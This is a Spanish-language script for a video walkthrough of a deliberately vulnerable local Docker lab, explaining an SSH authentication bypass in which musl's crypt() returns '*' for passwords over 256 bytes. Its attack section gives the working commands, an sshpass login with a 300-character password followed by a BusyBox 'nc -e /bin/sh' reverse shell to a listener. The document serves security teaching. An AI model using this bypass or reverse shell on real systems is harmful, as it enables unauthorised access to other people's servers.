# Eseeseache — CVE-2026-123158 ("sshole"): guion técnico

> Laboratorio BunkerLabs (`dockerlabs.es/bunkerlabs`, autor "El Pingüino de Mario"). Se descarga de forma
> anónima (sin crear cuenta) desde esa URL: tarjeta "Eseeseache" → icono de descarga → `.zip` con
> `auto_deploy.sh` + `eseseache.tar`. Se despliega **solo en Docker local** (red bridge `172.17.0.0/16`,
> nunca expuesto a internet). Marco igual que `DEMO-IDOR`: laboratorio propio, vulnerable a propósito.

## 1. Qué es (para el guion del vídeo)
El contenedor expone un puerto 22 que **parece** OpenSSH 9.9 (banner falso), pero en realidad es un
servidor SSH hecho a medida en Python con `paramiko` (se ve en `docker history`: copian un `sshd` y un
`ssh-keygen` propios, instalan `py3-paramiko`, y el `Dockerfile` incluye un `/home/exploit.py` de PoC).

**La vulnerabilidad real (musl `crypt()`):** en Alpine Linux (musl libc), `crypt()` devuelve literalmente
la cadena `"*"` cuando la contraseña recibida supera 256 bytes **y** el campo de hash guardado en
`/etc/shadow` es también `"*"` (que normalmente significa "cuenta sin contraseña, login por contraseña
desactivado"). Un servidor SSH sin PAM que compare el resultado de `crypt()` directamente contra el campo
de `/etc/shadow` ve `"*" == "*"` → **login aceptado sin conocer ninguna contraseña real**.

El usuario `alice` se crea así en la imagen (ver `docker history --no-trunc eseseache`):
```
adduser -D -s /bin/sh alice
sed -E -i 's/^alice:[^:]*:/alice:*:/' /etc/shadow      # hash forzado a '*'
```
Shell de alice: `/bin/sh` → BusyBox (Alpine). `nc` de BusyBox soporta `-e PROG` (ejecutar un programa tras
conectar): sirve para la reverse shell sin instalar nada más.

## 2. La cadena de ataque (medida, funciona)
```bash
# 1) Reconocimiento
nmap -sV -sC -p- --min-rate 2000 <IP_VICTIMA>        # 22/tcp abierto, banner "OpenSSH 9.9" (falso)

# 2) Explotar: contraseña de más de 256 caracteres
PASS=$(python3 -c "print('A'*300)")
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=accept-new \
  -o PreferredAuthentications=password alice@<IP_VICTIMA> id
# → uid=1000(alice) gid=1000(alice) groups=1000(alice)        ← BYPASS CONFIRMADO

# 3) Reverse shell (listener en el Kali, en la IP del propio docker0, ej. 172.17.0.1)
nc -lvnp 4444                                          # en una segunda terminal, ANTES del paso siguiente
sshpass -p "$PASS" ssh -o StrictHostKeyChecking=accept-new \
  -o PreferredAuthentications=password alice@<IP_VICTIMA> "nc 172.17.0.1 4444 -e /bin/sh"
# → en el listener: shell interactiva como alice
```
**Orden exacto de `nc -e` en BusyBox:** `nc HOST PORT -e PROG` (si `-e` va antes de HOST/PORT, BusyBox
imprime la ayuda y falla con `exit=1` — medido).

**IP del atacante que ve el contenedor:** la pasarela del bridge de Docker (`ip -4 addr show docker0`,
normalmente `172.17.0.1`), no la IP del Kali en la red del anfitrión — el contenedor solo tiene esa ruta.

## 3. Por qué el host key NO cambia entre despliegues
`ssh-keygen -A` se ejecuta **al construir la imagen** (capa del Dockerfile), no al arrancar el contenedor:
la clave es la misma en cada redeploy. Solo hace falta `ssh-keygen -R <IP>` la primera vez que esa IP
estuvo ocupada por OTRO laboratorio (las IPs del bridge de Docker se reciclan).

## 4. Para el vídeo (guion sugerido)
1. **Gancho:** "¿Sabías que una contraseña demasiado larga puede ser un fallo de seguridad?"
2. **nmap:** puerto 22 abierto, versión de SSH.
3. **El fallo explicado** (pizarra/voz en off): musl `crypt()` + hash `'*'` + contraseña > 256 bytes.
4. **La explotación:** `sshpass` + contraseña de 300 caracteres → `id` confirma el acceso.
5. **La reverse shell:** listener + `nc -e /bin/sh` → shell interactiva.
6. **Cierre:** por qué pasa esto en la vida real (cuentas de servicio con password deshabilitada +
   SSH mal configurado sin PAM) y cómo se arregla (usar PAM, o limitar la longitud de contraseña antes
   de pasarla a `crypt()`).

## 5. Limpieza
`docker rm -f eseseache_container` al terminar (el script `demo_sshole.py` lo hace solo, fuera de grabación).
No se tocó nada del anfitrión ni de la red real: todo quedó en `172.17.0.0/16`.
